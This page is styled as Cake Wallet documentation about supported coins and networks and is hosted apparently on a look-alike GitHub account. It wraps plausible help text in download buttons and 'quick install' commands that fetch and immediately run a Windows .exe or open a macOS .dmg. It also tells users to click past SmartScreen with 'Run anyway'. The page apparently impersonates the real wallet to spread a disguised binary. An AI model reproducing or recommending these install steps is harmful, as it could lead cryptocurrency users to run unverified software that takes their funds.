![Cake Wallet supported coins networks guide](assets/cake-wallet-supported-coins-networks-article-banner.png)

# Cake Wallet Supported Coins and Networks

What each chain gives you, and why a token can be missing while the chain works.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Cake Wallet supports Bitcoin with Lightning, Monero, Litecoin with MWEB, Ethereum and EVM tokens, Bitcoin Cash, Zcash, Tron, Solana, Polygon, Nano, Haven, Arbitrum and BNB Smart Chain. A token that does not appear usually needs adding by contract address, and a network that is missing is a version question, not a wallet defect.

<!-- ARTICLE-BODY-BEGIN -->

## Which coins and networks
Coverage comes from the documentation, repository topics and release notes. The core set is Bitcoin, Monero, Litecoin, Ethereum and its tokens; the extended set adds Bitcoin Cash, Zcash, Tron, Solana, Polygon, Nano, Arbitrum and BNB Smart Chain, with Haven kept for legacy wallets.

Coverage is per network, not per token. Holding USDT on Tron and USDT on Ethereum are two different wallets with two different addresses. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-custom-tokens.md">Add custom tokens in Cake Wallet</a> covers the case where the network is supported but the token is invisible.

## Bitcoin balances
Bitcoin appears twice: as an on-chain balance and as a Lightning balance for cheaper, faster payments. They are separate balances inside the same wallet, and moving between them is a swap or a channel operation rather than a send.

Lightning needs its own liquidity, so a fresh install shows an empty Lightning balance until you fund it. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-lightning.md">Bitcoin Lightning in Cake Wallet</a> walks through funding and paying an invoice, including why a Lightning payment can fail for liquidity reasons rather than fee ones.

## Privacy coins
Zcash gives you a choice between transparent and shielded addresses; sending to a shielded address hides the amount and the parties, and the wallet can move funds to the shielded pool automatically. Monero is private by default, which is a protocol property rather than a setting.

Privacy is not one switch across the app. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-zcash-shielded.md">Zcash shielded addresses</a> explains what each address type reveals, and when a transparent deposit still links to you.

## Litecoin
Litecoin works as a transparent chain and with MWEB, its extension block with confidential amounts. Moving between the two is a separate action from a normal send, and an exchange deposit may not accept the MWEB side.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-litecoin-mweb.md">Litecoin MWEB in Cake Wallet</a> covers what MWEB hides and what it does not, which decides whether a peg-out is worth it for your use.

## Tokens that do not appear on their own
EVM tokens are contracts, not native coins, so the wallet needs the contract address before it can display a balance. A transfer that arrived but shows nothing is usually a token that was never added, or one added on the wrong network.

Adding the token does not move funds; it reveals what the address already holds. That is why the balance appears instantly once the contract is right.

## Networks beyond the default list
Some networks arrived later than others, and an older build may not list them at all. Tron support, for example, includes dApp connections through WalletConnect in current versions and nothing of the kind in older ones.

If a network is missing, check the build before you check anything else. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-tron-walletconnect.md">Connect a Tron dApp</a> states the version boundary for that feature so you do not chase a setting that does not exist.

## Install a current build
Coin and network coverage is the part of the product that changes most between releases. Install the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">latest Cake Wallet release</a> before concluding that a coin is unsupported.

An old build is the most common reason a supported network is missing from the list. Updating keeps your wallets and costs nothing.

## FAQ
### Which coins does Cake Wallet support?
Bitcoin, Monero, Litecoin, Ethereum and EVM tokens, Bitcoin Cash, Zcash, Tron, Solana, Polygon, Nano, Haven, Arbitrum and BNB Smart Chain.
### Does it support USDT on Tron and Ethereum?
Yes, as two separate tokens on two networks with different addresses.
### Does it support Solana tokens?
Solana is a supported network; token display follows the same rule as EVM tokens and may need adding.
### Does it support Nano or Haven?
Both are evidenced. Haven support ended in v4.24.0, so treat it as a legacy wallet.
### Why do Nano nodes fail to connect?
The configured node is unreachable or outdated. Switch to a working node rather than reinstalling.
### Is there a free Lightning wallet?
Cake Wallet's Lightning balance costs nothing to use beyond network fees; the balance itself needs funding first.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[add custom tokens in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-custom-tokens.md) · [Zcash shielded addresses](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-zcash-shielded.md) · [Litecoin MWEB in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-litecoin-mweb.md) · [Bitcoin Lightning in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-lightning.md) · [latest Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
